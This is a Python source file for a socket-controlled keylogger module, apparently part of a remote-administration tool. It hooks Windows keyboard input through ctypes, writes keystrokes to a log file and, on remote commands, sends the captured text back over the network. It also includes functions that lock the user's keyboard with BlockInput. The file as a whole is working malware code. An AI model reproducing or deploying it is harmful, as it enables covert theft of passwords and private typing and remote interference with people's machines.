from ctypes import *
from ctypes.wintypes import DWORD, MSG
import KeyLog
import threading

class keyboardController():
    def __init__(self, clientSocket):
        self.client = clientSocket
        self.HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
        self.keyhook = KeyLog.KeyHook()

    def startKlog(self):
        pointer = self.HOOKPROC(KeyLog.hookProc)
        if self.keyhook.installHookProc(pointer) == True:
            try:
                msg = MSG()
                KeyLog.user32.GetMessageA(byref(msg), 0, 0, 0) 
            except:
                self.keyhook.unistallHookProc()
                return
        

    def keyStroke(self):
        request = ""
        while True:
            request = self.client.recv(1024).decode("utf-8")
            if not request:
                break
            if request == "Hook":
                self.hookKey()
            elif request == "Unhook":
                self.unhookKey()
            elif request == "Print":
                self.printKey()
            else: #Quit
                return

    def hookKey(self):
        tkLog = threading.Thread(target=self.startKlog) 
        tkLog.daemon = True
        open(KeyLog.FilLogPath, "w")
        tkLog.start()
    
    def unhookKey(self):
        self.keyhook.unistallHookProc()

    def printKey(self):
        self.keyhook.unistallHookProc()
        s = ""
        with open(KeyLog.FilLogPath, 'r') as f:
            s = f.read()
        f.close()
        if s=="": 
            ss = "No"
            self.client.sendall(ss.encode('utf-8'))
        else:
            ss = "Yes"
            self.client.sendall(ss.encode('utf-8'))
            check = self.client.recv(10)
            open(KeyLog.FilLogPath, "w")
            self.client.sendall(s.encode('utf-8'))

    def lockKeyboard():
        while True:
            windll.user32.BlockInput(True);

    def unlockKeyboard():
        windll.user32.BlockInput(False); 

